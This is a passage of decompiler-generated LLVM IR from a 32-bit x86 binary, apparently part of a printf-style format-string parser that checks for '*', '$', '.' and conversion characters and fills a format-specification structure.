  %stack_var_-96.3 = phi i32 [ %stack_var_-96.1, %dec_label_pc_804f25d ], [ %stack_var_-96.2, %dec_label_pc_804f2dd ], [ 0, %dec_label_pc_804f2af ], [ %stack_var_-96.1, %dec_label_pc_804f2a1 ]
  %v1_804f2f4 = inttoptr i32 %v0_804f31d to i8*
  %v2_804f2f4 = load i8, i8* %v1_804f2f4, align 1
  %v11_804f2f4 = icmp eq i8 %v2_804f2f4, 42
  %v1_804f2f7 = icmp eq i1 %v11_804f2f4, false
  br i1 %v1_804f2f7, label %dec_label_pc_804f32d, label %dec_label_pc_804f2f9

dec_label_pc_804f2f9:                             ; preds = %dec_label_pc_804f2f4
  %v4_804f2f9 = icmp eq i32 %stack_var_-96.3, 0
  br i1 %v4_804f2f9, label %dec_label_pc_804f31d, label %dec_label_pc_804f300

dec_label_pc_804f300:                             ; preds = %dec_label_pc_804f2f9
  %v1_804f300 = inttoptr i32 %v1_804f320 to i8*
  %v2_804f300 = load i8, i8* %v1_804f300, align 1
  %v11_804f300 = icmp eq i8 %v2_804f300, 36
  %v1_804f303 = icmp eq i1 %v11_804f300, false
  br i1 %v1_804f303, label %dec_label_pc_804f581, label %dec_label_pc_804f309

dec_label_pc_804f309:                             ; preds = %dec_label_pc_804f300
  %tmp88 = icmp slt i32 %v0_804f317, 1
  br i1 %tmp88, label %dec_label_pc_804f581, label %dec_label_pc_804f311

dec_label_pc_804f311:                             ; preds = %dec_label_pc_804f309
  %v1_804f311 = add i32 %v1_804f320, 1
  store i32 %v1_804f311, i32* @esi, align 4
  %v7_804f312 = mul nsw i64 %stack_var_-100.1, -4
  %v8_804f312 = trunc i64 %v7_804f312 to i32
  store i32 %v8_804f312, i32* %eax.global-to-local, align 4
  %v1_804f317 = load i32, i32* @esp, align 4
  %v3_804f317 = add i32 %v8_804f312, 76
  %v4_804f317 = add i32 %v3_804f317, %v1_804f317
  %v5_804f317 = inttoptr i32 %v4_804f317 to i32*
  store i32 %v0_804f317, i32* %v5_804f317, align 4
  %v0_804f355.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f328

dec_label_pc_804f31d:                             ; preds = %dec_label_pc_804f2f9
  %v1_804f31d = add i32 %v0_804f31d, 1
  store i32 %v1_804f31d, i32* %eax.global-to-local, align 4
  %v12_804f320 = icmp eq i32 %v1_804f31d, %v1_804f320
  %v1_804f322 = icmp eq i1 %v12_804f320, false
  br i1 %v1_804f322, label %dec_label_pc_804f581, label %dec_label_pc_804f328

dec_label_pc_804f328:                             ; preds = %dec_label_pc_804f31d, %dec_label_pc_804f311
  %v0_804f355.pre.pre.pre = phi i32 [ %v1_804f320, %dec_label_pc_804f31d ], [ %v0_804f355.pre.pre.pre.pre, %dec_label_pc_804f311 ]
  store i32 -2147483648, i32* @edi, align 4
  br label %dec_label_pc_804f32d

dec_label_pc_804f32d:                             ; preds = %dec_label_pc_804f2f4, %dec_label_pc_804f328
  %v0_804f355.pre.pre = phi i32 [ %v1_804f320, %dec_label_pc_804f2f4 ], [ %v0_804f355.pre.pre.pre, %dec_label_pc_804f328 ]
  %v0_804f34a = phi i32 [ %v0_804f317, %dec_label_pc_804f2f4 ], [ -2147483648, %dec_label_pc_804f328 ]
  %v4_804f32d = trunc i64 %stack_var_-100.1 to i32
  %v5_804f32d = icmp eq i32 %v4_804f32d, 0
  %v1_804f332 = icmp eq i1 %v5_804f32d, false
  %.pre = inttoptr i32 %v0_804f355.pre.pre to i8*
  br i1 %v1_804f332, label %dec_label_pc_804f350, label %dec_label_pc_804f334

dec_label_pc_804f334:                             ; preds = %dec_label_pc_804f32d
  %v2_804f334 = load i8, i8* %.pre, align 1
  %v11_804f334 = icmp eq i8 %v2_804f334, 46
  %v1_804f337 = icmp eq i1 %v11_804f334, false
  br i1 %v1_804f337, label %dec_label_pc_804f34a, label %dec_label_pc_804f339

dec_label_pc_804f339:                             ; preds = %dec_label_pc_804f334
  %v1_804f339 = add i32 %v0_804f355.pre.pre, 1
  store i32 %v1_804f339, i32* %esi.global-to-local, align 4
  store i32 %v0_804f34a, i32* %stack_var_-104, align 4
  br label %dec_label_pc_804f20c

dec_label_pc_804f34a:                             ; preds = %dec_label_pc_804f334
  store i32 %v0_804f34a, i32* %stack_var_-104, align 4
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804f350

dec_label_pc_804f350:                             ; preds = %dec_label_pc_804f32d, %dec_label_pc_804f34a
  store i32 ptrtoint ([9 x i8]* @global_var_8051338.132 to i32), i32* @edx, align 4
  %v4_804f355.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f355

dec_label_pc_804f355:                             ; preds = %dec_label_pc_804f35e, %dec_label_pc_804f350
  %v0_804f35e = phi i32 [ %v1_804f35e, %dec_label_pc_804f35e ], [ ptrtoint ([9 x i8]* @global_var_8051338.132 to i32), %dec_label_pc_804f350 ]
  %v4_804f355 = phi i32 [ %v6_804f355, %dec_label_pc_804f35e ], [ %v4_804f355.pre, %dec_label_pc_804f350 ]
  %v2_804f355 = load i8, i8* %.pre, align 1
  %v3_804f355 = zext i8 %v2_804f355 to i32
  %v5_804f355 = and i32 %v4_804f355, -256
  %v6_804f355 = or i32 %v3_804f355, %v5_804f355
  store i32 %v6_804f355, i32* %eax.global-to-local, align 4
  %v3_804f357 = inttoptr i32 %v0_804f35e to i8*
  %v4_804f357 = load i8, i8* %v3_804f357, align 1
  %v15_804f357 = icmp eq i8 %v2_804f355, %v4_804f357
  %v1_804f359 = icmp eq i1 %v15_804f357, false
  br i1 %v1_804f359, label %dec_label_pc_804f35e, label %dec_label_pc_804f35b

dec_label_pc_804f35b:                             ; preds = %dec_label_pc_804f355
  %v1_804f35b = add i32 %v0_804f355.pre.pre, 1
  store i32 %v1_804f35b, i32* @esi, align 4
  br label %dec_label_pc_804f364

dec_label_pc_804f35e:                             ; preds = %dec_label_pc_804f355
  %v1_804f35e = add i32 %v0_804f35e, 1
  store i32 %v1_804f35e, i32* @edx, align 4
  %v1_804f35f = inttoptr i32 %v1_804f35e to i8*
  %v2_804f35f = load i8, i8* %v1_804f35f, align 1
  %v3_804f35f = icmp eq i8 %v2_804f35f, 0
  %v1_804f362 = icmp eq i1 %v3_804f35f, false
  br i1 %v1_804f362, label %dec_label_pc_804f355, label %dec_label_pc_804f364

dec_label_pc_804f364:                             ; preds = %dec_label_pc_804f35e, %dec_label_pc_804f35b
  %v0_804f377 = phi i32 [ %v1_804f35b, %dec_label_pc_804f35b ], [ %v0_804f355.pre.pre, %dec_label_pc_804f35e ]
  %v0_804f374 = phi i32 [ %v0_804f35e, %dec_label_pc_804f35b ], [ %v1_804f35e, %dec_label_pc_804f35e ]
  %v1_804f366 = add i32 %v0_804f374, -134550328
  %v1_804f36b = add i32 %v0_804f374, -134550329
  %v5_804f36b = sub i32 134550328, %v0_804f374
  %v6_804f36b = and i32 %v1_804f366, %v5_804f36b
  %v7_804f36b = icmp slt i32 %v6_804f36b, 0
  %v8_804f36b = icmp eq i32 %v1_804f36b, 0
  %v9_804f36b = icmp slt i32 %v1_804f36b, 0
  store i32 %v1_804f36b, i32* %eax.global-to-local, align 4
  %v3_804f36c = icmp eq i1 %v9_804f36b, %v7_804f36b
  %v4_804f36c = icmp eq i1 %v8_804f36b, false
  %v5_804f36c = and i1 %v4_804f36c, %v3_804f36c
  br i1 %v5_804f36c, label %dec_label_pc_804f378, label %dec_label_pc_804f36e

dec_label_pc_804f36e:                             ; preds = %dec_label_pc_804f364
  %v1_804f36e = inttoptr i32 %v0_804f377 to i8*
  %v2_804f36e = load i8, i8* %v1_804f36e, align 1
  %v3_804f36e = zext i8 %v2_804f36e to i32
  %v5_804f36e = and i32 %v1_804f36b, -256
  %v6_804f36e = or i32 %v3_804f36e, %v5_804f36e
  store i32 %v6_804f36e, i32* %eax.global-to-local, align 4
  %v3_804f370 = inttoptr i32 %v0_804f374 to i8*
  %v4_804f370 = load i8, i8* %v3_804f370, align 1
  %v15_804f370 = icmp eq i8 %v2_804f36e, %v4_804f370
  %v1_804f372 = icmp eq i1 %v15_804f370, false
  br i1 %v1_804f372, label %dec_label_pc_804f378, label %dec_label_pc_804f374

dec_label_pc_804f374:                             ; preds = %dec_label_pc_804f36e
  %v1_804f374 = add i32 %v0_804f374, 9
  store i32 %v1_804f374, i32* @edx, align 4
  %v1_804f377 = add i32 %v0_804f377, 1
  store i32 %v1_804f377, i32* @esi, align 4
  br label %dec_label_pc_804f378

dec_label_pc_804f378:                             ; preds = %dec_label_pc_804f36e, %dec_label_pc_804f364, %dec_label_pc_804f374
  %v4_804f37f = phi i32 [ %v6_804f36e, %dec_label_pc_804f36e ], [ %v1_804f36b, %dec_label_pc_804f364 ], [ %v6_804f36e, %dec_label_pc_804f374 ]
  %v0_804f37f = phi i32 [ %v0_804f377, %dec_label_pc_804f36e ], [ %v0_804f377, %dec_label_pc_804f364 ], [ %v1_804f377, %dec_label_pc_804f374 ]
  %v0_804f378 = phi i32 [ %v0_804f374, %dec_label_pc_804f36e ], [ %v0_804f374, %dec_label_pc_804f364 ], [ %v1_804f374, %dec_label_pc_804f374 ]
  %v1_804f378 = add i32 %v0_804f378, 9
  %v2_804f378 = inttoptr i32 %v1_804f378 to i8*
  %v3_804f378 = load i8, i8* %v2_804f378, align 1
  %v4_804f378 = zext i8 %v3_804f378 to i32
  %v2_804f37c = mul nuw nsw i32 %v4_804f378, 256
  store i32 %v2_804f37c, i32* %ebx.global-to-local, align 4
  %v1_804f37f = inttoptr i32 %v0_804f37f to i8*
  %v2_804f37f = load i8, i8* %v1_804f37f, align 1
  %v3_804f37f = zext i8 %v2_804f37f to i32
  %v5_804f37f = and i32 %v4_804f37f, -256
  %v6_804f37f = or i32 %v3_804f37f, %v5_804f37f
  store i32 %v6_804f37f, i32* %eax.global-to-local, align 4
  %v4_804f381 = icmp eq i8 %v2_804f37f, 0
  br i1 %v4_804f381, label %dec_label_pc_804f581, label %dec_label_pc_804f389

dec_label_pc_804f389:                             ; preds = %dec_label_pc_804f378
  store i32 ptrtoint ([21 x i8]* @global_var_8051378.133 to i32), i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f38e

dec_label_pc_804f38e:                             ; preds = %dec_label_pc_804f3df, %dec_label_pc_804f389
  %v0_804f3df = phi i32 [ %v1_804f3df, %dec_label_pc_804f3df ], [ ptrtoint ([21 x i8]* @global_var_8051378.133 to i32), %dec_label_pc_804f389 ]
  %v3_804f38e = inttoptr i32 %v0_804f3df to i8*
  %v4_804f38e = load i8, i8* %v3_804f38e, align 1
  %v15_804f38e = icmp eq i8 %v2_804f37f, %v4_804f38e
  %v1_804f390 = icmp eq i1 %v15_804f38e, false
  br i1 %v1_804f390, label %dec_label_pc_804f3df, label %dec_label_pc_804f392

dec_label_pc_804f392:                             ; preds = %dec_label_pc_804f38e
  %v1_804f392 = add i32 %v0_804f3df, -134550392
  store i32 %v1_804f392, i32* %edx.global-to-local, align 4
  %v7_804f39b = icmp sgt i32 %v1_804f392, 17
  br i1 %v7_804f39b, label %dec_label_pc_804f39d, label %dec_label_pc_804f3a5

dec_label_pc_804f39d:                             ; preds = %dec_label_pc_804f392
  %v3_804f39d = and i32 %v2_804f37c, 1024
  %v4_804f39d = icmp eq i32 %v3_804f39d, 0
  br i1 %v4_804f39d, label %dec_label_pc_804f3a5, label %dec_label_pc_804f3a2

dec_label_pc_804f3a2:                             ; preds = %dec_label_pc_804f39d
  %v1_804f3a2 = add i32 %v0_804f3df, -134550394
  store i32 %v1_804f3a2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f3a5

dec_label_pc_804f3a5:                             ; preds = %dec_label_pc_804f392, %dec_label_pc_804f39d, %dec_label_pc_804f3a2
  %v0_804f3a9 = phi i32 [ %v1_804f392, %dec_label_pc_804f392 ], [ %v1_804f392, %dec_label_pc_804f39d ], [ %v1_804f3a2, %dec_label_pc_804f3a2 ]
  %v2_804f3a9 = add i32 %tmp67, 32
  %v3_804f3a9 = inttoptr i32 %v2_804f3a9 to i32*
  store i32 %v0_804f3a9, i32* %v3_804f3a9, align 4
  store i32 ptrtoint (i32* @global_var_805136b.134 to i32), i32* %ecx.global-to-local, align 4
  %v0_804f3b5.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f3b1

dec_label_pc_804f3b1:                             ; preds = %dec_label_pc_804f3b1, %dec_label_pc_804f3a5
  %v0_804f3b1 = phi i32 [ %v1_804f3b1, %dec_label_pc_804f3b1 ], [ ptrtoint (i32* @global_var_805136b.134 to i32), %dec_label_pc_804f3a5 ]
  %v1_804f3b1 = add i32 %v0_804f3b1, 1
  store i32 %v1_804f3b1, i32* %ecx.global-to-local, align 4
  %v1_804f3b2 = inttoptr i32 %v1_804f3b1 to i8*
  %v2_804f3b2 = load i8, i8* %v1_804f3b2, align 1
  %v3_804f3b2 = zext i8 %v2_804f3b2 to i32
  store i32 %v3_804f3b2, i32* %eax.global-to-local, align 4
  %v8_804f3b7 = icmp sgt i32 %v0_804f3b5.pre, %v3_804f3b2
  br i1 %v8_804f3b7, label %dec_label_pc_804f3b1, label %dec_label_pc_804f3b9

dec_label_pc_804f3b9:                             ; preds = %dec_label_pc_804f3b1
  %v1_804f3bb = add i32 %v0_804f3b1, -134550379
  store i32 %v1_804f3bb, i32* %eax.global-to-local, align 4
  %v2_804f3c0 = add i32 %v0_804f3b1, add (i32 ptrtoint (i32* @global_var_805135c.135 to i32), i32 -134550379)
  %v3_804f3c0 = add i32 %v2_804f3c0, %v1_804f3bb
  %v4_804f3c0 = inttoptr i32 %v3_804f3c0 to i16*
  %v5_804f3c0 = load i16, i16* %v4_804f3c0, align 2
  %v6_804f3c0 = sext i16 %v5_804f3c0 to i32
  %v1_804f3c8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f3c8 = or i32 %v1_804f3c8, %v6_804f3c0
  store i32 %v2_804f3c8, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804f3bb, 2
  %v3_804f3ca = add i32 %factor, 134550348
  %v4_804f3ca = inttoptr i32 %v3_804f3ca to i16*
  %v5_804f3ca = load i16, i16* %v4_804f3ca, align 2
  %v6_804f3ca = sext i16 %v5_804f3ca to i32
  store i32 %v6_804f3ca, i32* %eax.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_8051378.133 to i32), i32* @edx, align 4
  %v0_804f3e5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f3e5

dec_label_pc_804f3df:                             ; preds = %dec_label_pc_804f38e
  %v1_804f3df = add i32 %v0_804f3df, 1
  store i32 %v1_804f3df, i32* @edx, align 4
  %v1_804f3e0 = inttoptr i32 %v1_804f3df to i8*
  %v2_804f3e0 = load i8, i8* %v1_804f3e0, align 1
  %v3_804f3e0 = icmp eq i8 %v2_804f3e0, 0
  %v1_804f3e3 = icmp eq i1 %v3_804f3e0, false
  br i1 %v1_804f3e3, label %dec_label_pc_804f38e, label %dec_label_pc_804f3e5

dec_label_pc_804f3e5:                             ; preds = %dec_label_pc_804f3df, %dec_label_pc_804f3b9
  %v0_804f3e5 = phi i32 [ %v0_804f3e5.pre, %dec_label_pc_804f3b9 ], [ %v0_804f37f, %dec_label_pc_804f3df ]
  %v1_804f3e5 = inttoptr i32 %v0_804f3e5 to i8*
  %v2_804f3e5 = load i8, i8* %v1_804f3e5, align 1
  %v3_804f3e5 = zext i8 %v2_804f3e5 to i32
  store i32 %tmp67, i32* %ecx.global-to-local, align 4
  %v2_804f3ec = add i32 %tmp67, 12
  %v3_804f3ec = inttoptr i32 %v2_804f3ec to i32*
  store i32 %v3_804f3e5, i32* %v3_804f3ec, align 4
  %v0_804f3ef = load i32, i32* @edi, align 4
  %v1_804f3ef = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f3ef = add i32 %v1_804f3ef, 4
  %v3_804f3ef = inttoptr i32 %v2_804f3ef to i32*
  store i32 %v0_804f3ef, i32* %v3_804f3ef, align 4
  %v2_804f3f2 = load i32, i32* %stack_var_-104, align 4
  %v1_804f3f5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f3f5 = add i32 %v1_804f3f5, 8
  %v3_804f3f5 = inttoptr i32 %v2_804f3f5 to i32*
  store i32 %v2_804f3f2, i32* %v3_804f3f5, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v1_804f408 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f408 = add i32 %v1_804f408, 20
  %v3_804f408 = inttoptr i32 %v2_804f408 to i32*
  store i32 48, i32* %v3_804f408, align 4
  %v0_804f40b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f40b = and i32 %v0_804f40b, 3840
  %v0_804f411 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f411 = and i32 %v0_804f411, -5
  store i32 %v1_804f411, i32* %ebp.global-to-local, align 4
  %v2_804f414 = or i32 %v1_804f411, %v1_804f40b
  store i32 %v2_804f414, i32* %ebx.global-to-local, align 4
  %v1_804f416 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f416 = add i32 %v1_804f416, 16
  %v3_804f416 = inttoptr i32 %v2_804f416 to i32*
  store i32 %v2_804f414, i32* %v3_804f416, align 4
  %v0_804f419 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f419 = add i32 %v0_804f419, 28
  %v2_804f419 = inttoptr i32 %v1_804f419 to i32*
  store i32 1, i32* %v2_804f419, align 4
  %v0_804f420 = load i32, i32* @edx, align 4
  %v1_804f420 = inttoptr i32 %v0_804f420 to i8*
  %v2_804f420 = load i8, i8* %v1_804f420, align 1
  %v3_804f420 = icmp eq i8 %v2_804f420, 0
  %v1_804f423 = icmp eq i1 %v3_804f420, false
  br i1 %v1_804f423, label %dec_label_pc_804f48d, label %dec_label_pc_804f425

dec_label_pc_804f425:                             ; preds = %dec_label_pc_804f3e5
  %v0_804f425 = load i32, i32* @esi, align 4
  %v1_804f425 = inttoptr i32 %v0_804f425 to i8*
  %v2_804f425 = load i8, i8* %v1_804f425, align 1
  %v11_804f425 = icmp eq i8 %v2_804f425, 109
  %v1_804f428 = icmp eq i1 %v11_804f425, false
  br i1 %v1_804f428, label %dec_label_pc_804f43a, label %dec_label_pc_804f42a

dec_label_pc_804f42a:                             ; preds = %dec_label_pc_804f425
  %v0_804f42a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f42a = add i32 %v0_804f42a, 32
  %v2_804f42a = inttoptr i32 %v1_804f42a to i32*
  store i32 20, i32* %v2_804f42a, align 4
  %v0_804f431 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f431 = add i32 %v0_804f431, 28
  %v2_804f431 = inttoptr i32 %v1_804f431 to i32*
  store i32 0, i32* %v2_804f431, align 4
  br label %dec_label_pc_804f48d

dec_label_pc_804f43a:                             ; preds = %dec_label_pc_804f425
  %v1_804f43e = add i32 %tmp67, 32
  %v2_804f43e = inttoptr i32 %v1_804f43e to i32*
  store i32 21, i32* %v2_804f43e, align 4
  %v0_804f445 = load i8*, i8** @global_var_8053588, align 4
  %v1_804f445 = ptrtoint i8* %v0_804f445 to i32
  store i32 %v1_804f445, i32* %ebx.global-to-local, align 4
  %v1_804f44d = add i32 %v1_804f445, 10
  store i32 %v1_804f44d, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v1_804f463 = add i32 %tmp67, 4
  store i32 %v1_804f463, i32* %eax.global-to-local, align 4
  %v8_804f467 = load i32, i32* @global_var_8055ba4.137, align 4
  call void @__pseudo_call(i32 %v8_804f467)
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v0_804f472 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f472 = add i32 %arg1, 28
  %v3_804f472 = inttoptr i32 %v2_804f472 to i32*
  store i32 %v0_804f472, i32* %v3_804f472, align 4
  %v0_804f478 = load i32, i32* %eax.global-to-local, align 4
  %v7_804f47b = icmp sgt i32 %v0_804f478, 5
  br i1 %v7_804f47b, label %dec_label_pc_804f581, label %dec_label_pc_804f48d

dec_label_pc_804f48d:                             ; preds = %dec_label_pc_804f43a, %dec_label_pc_804f3e5, %dec_label_pc_804f42a
  %tmp90 = icmp slt i32 %stack_var_-96.3, 1
  br i1 %tmp90, label %dec_label_pc_804f521, label %dec_label_pc_804f498

dec_label_pc_804f498:                             ; preds = %dec_label_pc_804f48d
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_804f4d9 = add i32 %arg1, 40
  %v1_804f512 = add i32 %arg1, 28
  %v2_804f512 = inttoptr i32 %v1_804f512 to i32*
  %v4_804f4a7 = add i32 %tmp67, 36
  %v1_804f4b4 = add i32 %stack_var_-20.3, -2
  br label %dec_label_pc_804f49a

dec_label_pc_804f49a:                             ; preds = %dec_label_pc_804f50d, %dec_label_pc_804f498
  %v1_804f4b7 = phi i32 [ 0, %dec_label_pc_804f498 ], [ %v1_804f50d, %dec_label_pc_804f50d ]
  %stack_var_-100.2.off0 = phi i32 [ %v4_804f32d, %dec_label_pc_804f498 ], [ %stack_var_-100.3.off0, %dec_label_pc_804f50d ]
  %v1_804f49a = add i32 %v1_804f4b7, -2
  %v6_804f49a = sub i32 1, %v1_804f4b7
  %v7_804f49a = and i32 %v6_804f49a, %v1_804f4b7
  %v8_804f49a = icmp slt i32 %v7_804f49a, 0
  %v9_804f49a = icmp eq i32 %v1_804f49a, 0
  %v10_804f49a = icmp slt i32 %v1_804f49a, 0
  %v3_804f49d = icmp eq i1 %v10_804f49a, %v8_804f49a
  %v4_804f49d = icmp eq i1 %v9_804f49a, false
  %v5_804f49d = and i1 %v4_804f49d, %v3_804f49d
  br i1 %v5_804f49d, label %dec_label_pc_804f4b0, label %dec_label_pc_804f49f

dec_label_pc_804f49f:                             ; preds = %dec_label_pc_804f49a
  %v0_804f49f = load i32, i32* @esp, align 4
  %v2_804f49f = mul i32 %v1_804f4b7, 4
  %v3_804f49f = add i32 %v2_804f49f, 76
  %v4_804f49f = add i32 %v3_804f49f, %v0_804f49f
  %v5_804f49f = inttoptr i32 %v4_804f49f to i32*
  %v6_804f49f = load i32, i32* %v5_804f49f, align 4
  store i32 %v6_804f49f, i32* %eax.global-to-local, align 4
  store i32 %tmp67, i32* @edx, align 4
  %v1_804f4a7 = trunc i32 %v6_804f49f to i8
  %v5_804f4a7 = add i32 %v4_804f4a7, %v1_804f4b7
  %v6_804f4a7 = inttoptr i32 %v5_804f4a7 to i8*
  store i8 %v1_804f4a7, i8* %v6_804f4a7, align 1
  %v0_804f4ab = load i32, i32* %eax.global-to-local, align 4
  %v1_804f4ab = urem i32 %v0_804f4ab, 256
  br label %dec_label_pc_804f4b9

dec_label_pc_804f4b0:                             ; preds = %dec_label_pc_804f49a
  store i32 %v1_804f4b4, i32* %eax.global-to-local, align 4
  %v2_804f4b7 = add i32 %v1_804f4b7, %v1_804f4b4
  br label %dec_label_pc_804f4b9

dec_label_pc_804f4b9:                             ; preds = %dec_label_pc_804f49f, %dec_label_pc_804f4b0
  %v0_804f4cc = phi i32 [ %v1_804f4ab, %dec_label_pc_804f49f ], [ %v2_804f4b7, %dec_label_pc_804f4b0 ]
  store i32 %v0_804f4cc, i32* %eax.global-to-local, align 4
  %v6_804f4b9 = sub i32 %v0_804f4cc, %stack_var_-100.2.off0
  %v12_804f4b9 = xor i32 %v0_804f4cc, %stack_var_-100.2.off0
  %v13_804f4b9 = xor i32 %v6_804f4b9, %v0_804f4cc
  %v14_804f4b9 = and i32 %v13_804f4b9, %v12_804f4b9
  %v15_804f4b9 = icmp slt i32 %v14_804f4b9, 0
  %v16_804f4b9 = icmp eq i32 %v6_804f4b9, 0
  %v17_804f4b9 = icmp slt i32 %v6_804f4b9, 0
  %v3_804f4bd = icmp ne i1 %v17_804f4b9, %v15_804f4b9
  %v4_804f4bd = or i1 %v16_804f4b9, %v3_804f4bd
  br i1 %v4_804f4bd, label %dec_label_pc_804f4cc, label %dec_label_pc_804f4bf

dec_label_pc_804f4bf:                             ; preds = %dec_label_pc_804f4b9
  %v1_804f4bf = add i32 %v0_804f4cc, -9
  %v6_804f4bf = sub i32 8, %v0_804f4cc
  %v7_804f4bf = and i32 %v6_804f4bf, %v0_804f4cc
  %v8_804f4bf = icmp slt i32 %v7_804f4bf, 0
  %v9_804f4bf = icmp eq i32 %v1_804f4bf, 0
  %v10_804f4bf = icmp slt i32 %v1_804f4bf, 0
  %v3_804f4c2 = icmp eq i1 %v10_804f4bf, %v8_804f4bf
  %v4_804f4c2 = icmp eq i1 %v9_804f4bf, false
  %v5_804f4c2 = and i1 %v4_804f4c2, %v3_804f4c2
  br i1 %v5_804f4c2, label %dec_label_pc_804f581, label %dec_label_pc_804f4cc

dec_label_pc_804f4cc:                             ; preds = %dec_label_pc_804f4bf, %dec_label_pc_804f4b9
  %stack_var_-100.3.off0 = phi i32 [ %stack_var_-100.2.off0, %dec_label_pc_804f4b9 ], [ %v0_804f4cc, %dec_label_pc_804f4bf ]
  %v1_804f4cc = add i32 %v0_804f4cc, -1
  store i32 %v1_804f4cc, i32* %eax.global-to-local, align 4
  %v0_804f4d1 = load i32, i32* @esp, align 4
  %v1_804f4d1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f4d1 = mul i32 %v1_804f4d1, 4
  %v3_804f4d1 = add i32 %v0_804f4d1, 48
  %v4_804f4d1 = add i32 %v3_804f4d1, %v2_804f4d1
  %v5_804f4d1 = inttoptr i32 %v4_804f4d1 to i32*
  %v6_804f4d1 = load i32, i32* %v5_804f4d1, align 4
  store i32 %v6_804f4d1, i32* %edi.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v2_804f4d9 = mul i32 %v1_804f4cc, 4
  %v4_804f4d9 = add i32 %v3_804f4d9, %v2_804f4d9
  %v5_804f4d9 = inttoptr i32 %v4_804f4d9 to i32*
  %v6_804f4d9 = load i32, i32* %v5_804f4d9, align 4
  store i32 %v6_804f4d9, i32* @eax, align 4
  %v9_804f4dd = icmp eq i32 %v6_804f4d1, 8
  br i1 %v9_804f4dd, label %dec_label_pc_804f50d, label %dec_label_pc_804f4e2

dec_label_pc_804f4e2:                             ; preds = %dec_label_pc_804f4cc
  %v9_804f4e2 = icmp eq i32 %v6_804f4d9, 8
  br i1 %v9_804f4e2, label %dec_label_pc_804f4fd, label %dec_label_pc_804f4e7

dec_label_pc_804f4e7:                             ; preds = %dec_label_pc_804f4e2
  %v12_804f4e7 = icmp eq i32 %v6_804f4d9, %v6_804f4d1
  br i1 %v12_804f4e7, label %dec_label_pc_804f4fd, label %dec_label_pc_804f4eb

dec_label_pc_804f4eb:                             ; preds = %dec_label_pc_804f4e7
  %v1_804f4eb = call i32 @_promoted_size(i32 %v1_804f4cc)
  store i32 %v1_804f4eb, i32* %ebx.global-to-local, align 4
  %v0_804f4f2 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804f4f2, i32* @eax, align 4
  %v1_804f4f4 = call i32 @_promoted_size(i32 %v1_804f4cc)
  store i32 %v1_804f4f4, i32* %eax.global-to-local, align 4
  %v8_804f4fb = icmp sgt i32 %v1_804f4eb, %v1_804f4f4
  br i1 %v8_804f4fb, label %dec_label_pc_804f50d, label %dec_label_pc_804f4eb.dec_label_pc_804f4fd_crit_edge

dec_label_pc_804f4eb.dec_label_pc_804f4fd_crit_edge: ; preds = %dec_label_pc_804f4eb
  %v0_804f4fd.pre = load i32, i32* @esp, align 4
  %v1_804f4fd.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f4fd

dec_label_pc_804f4fd:                             ; preds = %dec_label_pc_804f4eb.dec_label_pc_804f4fd_crit_edge, %dec_label_pc_804f4e7, %dec_label_pc_804f4e2
  %v1_804f4fd = phi i32 [ %v1_804f4fd.pre, %dec_label_pc_804f4eb.dec_label_pc_804f4fd_crit_edge ], [ %v1_804f4d1, %dec_label_pc_804f4e7 ], [ %v1_804f4d1, %dec_label_pc_804f4e2 ]
  %v0_804f4fd = phi i32 [ %v0_804f4fd.pre, %dec_label_pc_804f4eb.dec_label_pc_804f4fd_crit_edge ], [ %v0_804f4d1, %dec_label_pc_804f4e7 ], [ %v0_804f4d1, %dec_label_pc_804f4e2 ]
  %v2_804f4fd = mul i32 %v1_804f4fd, 4
  %v3_804f4fd = add i32 %v0_804f4fd, 48
  %v4_804f4fd = add i32 %v3_804f4fd, %v2_804f4fd
  %v5_804f4fd = inttoptr i32 %v4_804f4fd to i32*
  %v6_804f4fd = load i32, i32* %v5_804f4fd, align 4
  store i32 %v6_804f4fd, i32* %eax.global-to-local, align 4
  store i32 %v1_804f4cc, i32* %ecx.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  store i32 %v6_804f4fd, i32* %v5_804f4d9, align 4
  br label %dec_label_pc_804f50d

dec_label_pc_804f50d:                             ; preds = %dec_label_pc_804f4eb, %dec_label_pc_804f4cc, %dec_label_pc_804f4fd
  %v0_804f50d = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f50d = add i32 %v0_804f50d, 1
  store i32 %v1_804f50d, i32* %ebp.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v3_804f512 = load i32, i32* %v2_804f512, align 4
  %v1_804f515 = add i32 %v3_804f512, 2
  store i32 %v1_804f515, i32* %eax.global-to-local, align 4
  %v5_804f51a = icmp slt i32 %v1_804f50d, %v1_804f515
  br i1 %v5_804f51a, label %dec_label_pc_804f49a, label %dec_label_pc_804f547

dec_label_pc_804f521:                             ; preds = %dec_label_pc_804f48d
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804f525 = add i32 %arg1, 38
  %v2_804f525 = inttoptr i32 %v1_804f525 to i8*
  store i8 1, i8* %v2_804f525, align 1
